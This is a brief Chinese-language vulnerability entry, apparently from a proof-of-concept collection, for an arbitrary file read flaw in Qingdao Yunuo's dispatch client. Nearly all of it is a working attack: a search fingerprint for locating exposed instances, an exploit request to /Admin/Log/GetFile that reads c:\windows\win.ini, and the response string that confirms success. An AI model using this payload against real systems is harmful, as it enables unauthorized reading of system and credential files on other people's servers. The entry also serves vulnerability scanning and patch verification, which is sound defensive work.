# 青岛雨诺网络信息股份有限公司雨诺调度客户端GetFile存在任意文件读取漏洞

青岛雨诺网络信息股份有限公司雨诺调度客户端 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/Captcha/Index"`
- **请求**：`GET /Admin/Log/GetFile?filename=c:\windows\win.ini HTTP/1.1`
- **响应特征**：200 for-16-bit-app